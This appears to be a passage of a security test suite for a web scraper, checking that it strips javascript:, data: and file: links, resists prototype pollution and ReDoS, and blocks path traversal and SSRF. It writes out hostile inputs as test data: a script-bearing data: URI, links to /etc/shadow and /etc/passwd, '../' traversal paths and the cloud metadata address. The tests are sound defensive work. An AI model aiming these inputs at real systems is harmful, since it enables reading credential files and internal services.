    assert.ok(!result.markdown.includes('javascript:'));
    assert.ok(result.markdown.includes('Click')); // text preserved
});

test('XSS: data: URI stripped from markdown output', () => {
    const md = new Markdownifier();
    const html = '<html><body><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Safe text</a></body></html>';
    const result = md.extractAll(html, 'https://safe.com', { optimizeTokens: false });
    assert.ok(!result.markdown.includes('data:'));
});

test('XSS: file: URI stripped from links array', () => {
    const md = new Markdownifier();
    const html = '<html><body><a href="file:///etc/shadow">secrets</a><a href="https://safe.com/ok">ok</a></body></html>';
    const result = md.extractAll(html, 'https://safe.com', { optimizeTokens: false });
    for (const link of result.links) {
        assert.ok(!link.startsWith('file:'), `file: URI in links: ${link}`);
    }
});

// ── Prototype pollution via metadata ──

test('prototype pollution: __proto__ in OG meta tags blocked', () => {
    const md = new Markdownifier();
    const html = '<html><head><meta property="__proto__" content="polluted"><meta property="og:title" content="ok"></head><body>x</body></html>';
    const result = md.extractAll(html, 'https://x.com', { optimizeTokens: false });
    assert.equal((Object.prototype as any).polluted, undefined);
    assert.equal(result.structured?.openGraph?.['__proto__'], undefined);
});

test('prototype pollution: constructor key in Twitter meta blocked', () => {
    const md = new Markdownifier();
    const html = '<html><head><meta name="constructor" content="evil"><meta name="twitter:card" content="summary"></head><body>x</body></html>';
    const result = md.extractAll(html, 'https://x.com', { optimizeTokens: false });
    assert.equal(result.structured?.twitter?.['constructor'], undefined);
});

// ── Robots.txt abuse ──

test('robots.txt: ReDoS pattern capped', async () => {
    const { parseRobotsTxt, isAllowedByRobots } = await import('../src/core/Robots.js');
    const evilPattern = '/a' + '*b'.repeat(25) + '$';  // 26 wildcard segments — exceeds cap of 20
    const robots = parseRobotsTxt('https://x.com', `User-agent: *\nDisallow: ${evilPattern}`, 'agent-crawl');
    const start = Date.now();
    const allowed = isAllowedByRobots('https://x.com/a' + 'xb'.repeat(25), robots);
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 100, `Robots matching took ${elapsed}ms — suspected DoS`);
    assert.equal(allowed, true); // pattern dropped, so URL is allowed
});

test('robots.txt: crawl-delay capped at 300s', async () => {
    const { parseRobotsTxt } = await import('../src/core/Robots.js');
    const robots = parseRobotsTxt('https://x.com', 'User-agent: *\nCrawl-delay: 999999', 'agent-crawl');
    assert.ok((robots.rules.crawlDelayMs ?? 0) <= 300_000, `Crawl delay ${robots.rules.crawlDelayMs}ms exceeds cap`);
});

// ── Memory exhaustion defenses ──

test('memory: chunkMarkdown caps output at MAX_CHUNKS', () => {
    // Very long markdown that would produce > 10K chunks at 50-token minimum
    const long = ('word '.repeat(60) + '\n\n').repeat(1000); // ~60K "tokens" of content
    const chunks = chunkMarkdown(long, { url: 'https://x.com', maxTokens: 50, overlapTokens: 0 });
    assert.ok(chunks.length <= 10_000, `Chunk count ${chunks.length} exceeds 10K cap`);
});

test('memory: normalizeUrl rejects output > 8192', () => {
    // URL with very long path — should throw
    assert.throws(
        () => normalizeUrl('https://x.com/' + 'a'.repeat(8200)),
        /maximum length/,
    );
});

// ── Path traversal defenses ──

test('path traversal: schema blocks .. in dir fields', async () => {
    const { ScrapeOptionsSchema } = await import('../src/schemas.js');
    assert.throws(() => ScrapeOptionsSchema.parse({
        url: 'https://x.com',
        cache: { dir: 'safe/../../etc' },
    }));
    assert.throws(() => ScrapeOptionsSchema.parse({
        url: 'https://x.com',
        httpCache: { dir: '..\\windows\\system32' },
    }));
    // Safe dirs should pass
    assert.doesNotThrow(() => ScrapeOptionsSchema.parse({
        url: 'https://x.com',
        cache: { dir: '.cache/my-app' },
    }));
});

test('path traversal: runtime safeCacheDir blocks .. in scrape', async () => {
    const { AgentCrawl } = await import('../src/AgentCrawl.js');
    // scrape with traversal dir should throw (safeCacheDir rejects before any I/O)
    await assert.rejects(
        () => AgentCrawl.scrape('https://example.com/', { cache: { dir: '../../../tmp/evil' } }),
        /[Pp]ath traversal/,
    );
});

// ════════════════════════════════════════════════════════════════════
// MUTATION-KILLING TESTS — these specifically target SmartFetcher's
// own defense layers that are shadowed by AgentCrawl's upfront checks.
// Without these, SmartFetcher's SSRF/protocol checks could be removed
// without any test failing (surviving mutants M1, M2).
// ════════════════════════════════════════════════════════════════════

test('SmartFetcher.fetch() directly blocks private host (127.0.0.1)', async () => {
    // This targets SmartFetcher's OWN isPrivateHost check, not AgentCrawl's.
    // Must not need globalThis.fetch mock — the check happens before fetch() is called.
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://127.0.0.1/admin', { retries: 0 });
    assert.equal(result.isStaticSuccess, false);
    assert.ok(result.error?.includes('private/internal'), `Expected SSRF block, got: ${result.error}`);
    assert.equal(result.html, '');
});

test('SmartFetcher.fetch() directly blocks private host (10.0.0.1)', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://10.0.0.1:8080/internal', { retries: 0 });
    assert.ok(result.error?.includes('private/internal'));
});

test('SmartFetcher.fetch() directly blocks localhost', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://localhost:3000/', { retries: 0 });
    assert.ok(result.error?.includes('private/internal'));
});

test('SmartFetcher.fetch() directly blocks [::1]', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://[::1]/', { retries: 0 });
    assert.ok(result.error?.includes('private/internal'));
});

test('SmartFetcher.fetch() directly blocks 169.254.x.x', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://169.254.169.254/latest/meta-data/', { retries: 0 });
    assert.ok(result.error?.includes('private/internal'), 'Cloud metadata endpoint not blocked');
});

test('SmartFetcher.fetch() directly blocks non-HTTP protocol (ftp:)', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('ftp://files.example.com/secret.txt', { retries: 0 });
    assert.ok(result.error?.includes('protocol blocked') || result.error?.includes('Invalid URL'),
        `Expected protocol block, got: ${result.error}`);
    assert.equal(result.html, '');
});

test('SmartFetcher.fetch() directly blocks non-HTTP protocol (file:)', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('file:///etc/passwd', { retries: 0 });
    assert.ok(result.error?.includes('protocol blocked') || result.error?.includes('Invalid URL'),
        `Expected protocol block, got: ${result.error}`);
});

test('SmartFetcher.fetch() directly blocks .localhost TLD', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://evil.localhost/steal', { retries: 0 });
    assert.ok(result.error?.includes('private/internal'));
});

test('SmartFetcher.fetch() directly blocks .internal TLD', async () => {
    const fetcher = new SmartFetcher();
    const result = await fetcher.fetch('http://admin.internal/config', { retries: 0 });
    assert.ok(result.error?.includes('private/internal'));
});
